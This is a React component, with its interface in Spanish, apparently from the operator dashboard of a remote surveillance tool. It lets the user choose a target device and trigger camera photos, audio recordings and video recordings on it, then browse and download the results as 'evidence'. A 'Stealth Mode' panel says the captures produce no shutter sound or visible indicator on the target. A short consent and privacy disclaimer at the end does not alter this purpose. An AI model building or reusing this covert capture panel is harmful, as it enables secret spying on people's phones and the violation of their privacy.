import { useState } from "react";
import DashboardLayout from "@/components/DashboardLayout";
import { trpc } from "@/lib/trpc";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { toast } from "sonner";
import {
  Camera, Mic, Video, Trash2, 
  Download, Play, StopCircle, RefreshCw,
  ShieldAlert, Radio, Zap, Image as ImageIcon,
  Clock, Ghost, Settings2
} from "lucide-react";
import { formatDistanceToNow } from "date-fns";
import { es } from "date-fns/locale";

export default function MediaCapture() {
  const [selectedDeviceId, setSelectedDeviceId] = useState<number | null>(null);
  const [selectedCamera, setSelectedCamera] = useState<"front" | "back">("back");
  const [isRecordingAudio, setIsRecordingAudio] = useState(false);
  const [isRecordingVideo, setIsRecordingVideo] = useState(false);

  const { data: devices = [] } = trpc.devices.getAll.useQuery() as any;
  const { data: mediaFiles = [], refetch, isLoading } = trpc.fileExplorer.getMediaFiles.useQuery(
    { deviceId: selectedDeviceId! },
    { enabled: !!selectedDeviceId }
  );

  const takePhotoMutation = trpc.media.takePhoto.useMutation({
    onSuccess: () => toast.success("Comando de foto enviado! El archivo aparecerá pronto."),
    onError: (e) => toast.error(e.message),
  });

  const recordAudioMutation = trpc.media.recordAudio.useMutation({
    onSuccess: () => {
      setIsRecordingAudio(true);
      toast.success("Grabación de audio iniciada");
    },
    onError: (e) => toast.error(e.message),
  });

  const recordVideoMutation = trpc.media.recordVideo.useMutation({
    onSuccess: () => {
      setIsRecordingVideo(true);
      toast.success("Grabación de video iniciada");
    },
    onError: (e) => toast.error(e.message),
  });

  const stopMutation = trpc.media.stopRecording.useMutation({
    onSuccess: () => {
      setIsRecordingAudio(false);
      setIsRecordingVideo(false);
      toast.info("Grabación detenida");
    },
  });

  return (
    <DashboardLayout title="Captura Remota">
      <div className="space-y-6">
        {/* Header */}
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-3xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-rose-600 to-indigo-700">
              Captura Remota
            </h1>
            <p className="text-muted-foreground mt-1 text-sm tracking-tight">Vigilancia y recolección de evidencia multimedia en tiempo real</p>
          </div>
          <div className="flex gap-2">
             <Badge variant="outline" className="bg-rose-50 text-rose-700 border-rose-200">
              <Radio className="w-3 h-3 mr-1 animate-pulse" /> Live Monitoring
             </Badge>
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
          {/* Controls Panel */}
          <Card className="lg:col-span-1 border-accent/20 shadow-xl bg-slate-900 text-white overflow-hidden">
            <CardHeader className="border-b border-white/5 bg-white/5">
              <CardTitle className="text-sm font-bold flex items-center gap-2">
                <Settings2 className="w-4 h-4 text-rose-500" />
                Panel de Control
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-6 pt-6">
              <div className="space-y-2">
                <label className="text-[10px] uppercase font-bold text-slate-400">Objetivo</label>
                <Select
                  value={selectedDeviceId?.toString() ?? ""}
                  onValueChange={(v) => setSelectedDeviceId(Number(v))}
                >
                  <SelectTrigger className="bg-white/5 border-white/10 text-white">
                    <SelectValue placeholder="Dispositivo..." />
                  </SelectTrigger>
                  <SelectContent>
                    {(devices as any[]).map((d: any) => (
                      <SelectItem key={d.id} value={d.id.toString()}>
                        {d.deviceName}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              <div className="space-y-2">
                <label className="text-[10px] uppercase font-bold text-slate-400">Lente Cámara</label>
                <div className="flex p-1 bg-white/5 rounded-lg border border-white/10">
                  <button
                    onClick={() => setSelectedCamera("back")}
                    className={`flex-1 py-2 text-xs rounded-md transition-all ${selectedCamera === "back" ? "bg-rose-600 text-white shadow-lg" : "text-slate-400 hover:text-white"}`}
                  >
                    Principal
                  </button>
                  <button
                    onClick={() => setSelectedCamera("front")}
                    className={`flex-1 py-2 text-xs rounded-md transition-all ${selectedCamera === "front" ? "bg-rose-600 text-white shadow-lg" : "text-slate-400 hover:text-white"}`}
                  >
                    Frontal
                  </button>
                </div>
              </div>

              <div className="space-y-3 pt-4 border-t border-white/5">
                <Button 
                  onClick={() => takePhotoMutation.mutate({ deviceId: selectedDeviceId!, camera: selectedCamera })}
                  className="w-full bg-white text-slate-900 hover:bg-slate-200"
                  disabled={!selectedDeviceId || takePhotoMutation.isPending}
                >
                  <Camera className="w-4 h-4 mr-2" /> Capturar Foto
                </Button>

                <Button 
                  onClick={() => recordAudioMutation.mutate({ deviceId: selectedDeviceId! })}
                  className={`w-full ${isRecordingAudio ? "bg-rose-600 animate-pulse" : "bg-white/10 border border-white/10" }`}
                  disabled={!selectedDeviceId || recordAudioMutation.isPending}
                >
                  <Mic className="w-4 h-4 mr-2" /> {isRecordingAudio ? "Grabando Audio..." : "Grabar Audio"}
                </Button>

                <Button 
                  onClick={() => recordVideoMutation.mutate({ deviceId: selectedDeviceId!, camera: selectedCamera })}
                  className={`w-full ${isRecordingVideo ? "bg-rose-600 animate-pulse" : "bg-white/10 border border-white/10" }`}
                  disabled={!selectedDeviceId || recordVideoMutation.isPending}
                >
                  <Video className="w-4 h-4 mr-2" /> {isRecordingVideo ? "Grabando Video..." : "Grabar Video"}
                </Button>

                {(isRecordingAudio || isRecordingVideo) && (
                  <Button 
                    variant="destructive"
                    onClick={() => stopMutation.mutate({ deviceId: selectedDeviceId!, type: isRecordingAudio ? "audio" : "video" })}
                    className="w-full"
                  >
                    <StopCircle className="w-4 h-4 mr-2" /> Detener Captura
                  </Button>
                )}
              </div>

              <div className="bg-rose-500/10 border border-rose-500/20 rounded-xl p-3">
                <div className="flex items-center gap-2 mb-1 text-rose-500">
                  <Ghost className="w-3 h-3" />
                  <span className="text-[10px] font-bold uppercase">Stealth Mode</span>
                </div>
                <p className="text-[10px] text-rose-200 leading-relaxed">
                  Las capturas se realizan sin sonidos de obturador ni indicadores visuales en el dispositivo objetivo.
                </p>
              </div>
            </CardContent>
          </Card>

          {/* Media Gallery */}
          <Card className="lg:col-span-3 border-accent/20 shadow-sm overflow-hidden flex flex-col">
            <CardHeader className="pb-3 border-b flex flex-row items-center justify-between">
              <div>
                <CardTitle className="text-xl font-bold flex items-center gap-2">
                  <Zap className="w-5 h-5 text-amber-500" />
                  Galería de Evidencia
                </CardTitle>
                <CardDescription>Archivos multimedia recolectados del dispositivo</CardDescription>
              </div>
              <Button variant="outline" size="sm" onClick={() => refetch()} className="h-8">
                <RefreshCw className={`w-3 h-3 mr-2 ${isLoading ? "animate-spin" : ""}`} /> Actualizar
              </Button>
            </CardHeader>
            <CardContent className="p-6 bg-slate-50/50 flex-1">
              {!selectedDeviceId ? (
                <div className="h-[400px] flex flex-col items-center justify-center text-muted-foreground">
                  <ShieldAlert className="w-16 h-16 mb-4 opacity-5" />
                  <p className="text-sm font-medium">Selecciona un dispositivo para ver los registros</p>
                </div>
              ) : mediaFiles.length === 0 ? (
                 <div className="h-[400px] flex flex-col items-center justify-center text-muted-foreground border-2 border-dashed border-accent/20 rounded-3xl">
                  <ImageIcon className="w-16 h-16 mb-4 opacity-10" />
                  <p className="text-sm font-medium">No hay registros multimedia aún</p>
                  <p className="text-xs mt-1">Usa los controles laterales para realizar capturas</p>
                </div>
              ) : (
                <div className="grid grid-cols-2 md:grid-cols-3 xl:grid-cols-4 gap-4">
                  {mediaFiles.map((file: any) => (
                    <div key={file.id} className="group relative bg-white border border-accent/10 rounded-2xl overflow-hidden shadow-sm hover:shadow-md transition-all">
                      <div className="aspect-video bg-slate-100 flex items-center justify-center relative overflow-hidden">
                        {file.type === "photo" || file.type === "screenshot" ? (
                          <img src={file.url} className="w-full h-full object-cover" alt={file.name} />
                        ) : file.type === "video" ? (
                          <div className="relative w-full h-full flex items-center justify-center bg-black">
                            <Video className="w-8 h-8 text-white/50" />
                            <div className="absolute inset-0 flex items-center justify-center opacity-0 group-hover:opacity-100 bg-black/40 transition-opacity">
                              <Play className="w-8 h-8 text-white fill-white" />
                            </div>
                          </div>
                        ) : (
                          <Mic className="w-8 h-8 text-slate-400" />
                        )}
                        
                        <div className="absolute top-2 left-2">
                          <Badge className="bg-black/60 backdrop-blur-md text-[9px] uppercase tracking-wider py-0 px-2 h-5 border-none">
                            {file.type}
                          </Badge>
                        </div>
                      </div>
                      
                      <div className="p-3">
                        <p className="text-[11px] font-bold text-slate-700 truncate mb-1">{file.name}</p>
                        <div className="flex items-center justify-between">
                          <div className="flex items-center gap-1 text-[10px] text-muted-foreground">
                            <Clock className="w-3 h-3" />
                            {formatDistanceToNow(new Date(file.timestamp), { addSuffix: true, locale: es })}
                          </div>
                          <div className="flex gap-1">
                            <Button size="icon" variant="ghost" className="h-6 w-6 text-slate-400 hover:text-blue-600">
                             <a href={file.url} download><Download className="w-3 h-3" /></a>
                            </Button>
                            <Button size="icon" variant="ghost" className="h-6 w-6 text-slate-400 hover:text-rose-600">
                              <Trash2 className="w-3 h-3" />
                            </Button>
                          </div>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </CardContent>
          </Card>
        </div>

        {/* Security Warning */}
        <div className="bg-slate-900 text-slate-400 border border-slate-800 rounded-2xl p-4 text-[10px] leading-relaxed">
          <p className="font-bold text-slate-200 mb-1 flex items-center gap-2 uppercase tracking-widest">
            <ShieldAlert className="w-3 h-3 text-rose-500" /> Protocolo de Privacidad y Cumplimiento
          </p>
          <p>
            El uso de funciones de captura remota (Cámara y Micrófono) está sujeto a las leyes locales de privacidad y a las políticas corporativas de su organización. Todas las sesiones de captura son auditadas y registradas para propósitos de cumplimiento legal. Asegúrese de tener el consentimiento explícito o la autoridad legal antes de proceder con el monitoreo.
          </p>
        </div>
      </div>
    </DashboardLayout>
  );
}
